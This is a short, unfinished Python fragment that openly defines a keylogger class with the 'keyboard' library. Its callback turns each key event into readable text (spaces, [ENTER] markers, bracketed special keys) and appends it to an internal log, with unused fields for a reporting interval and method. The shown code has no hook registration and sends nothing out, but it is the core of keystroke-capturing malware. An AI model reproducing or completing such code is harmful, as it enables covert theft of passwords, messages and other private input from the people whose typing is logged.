import keyboard 

class keylogger:
    def __init__(self, interval, report_method=""):
        self.interval = interval 
        self.report_method = report_method
        self.log = ""

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " " 
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ","_")
                name = f"[{name.upper()}]"
        self.log += name

    



        
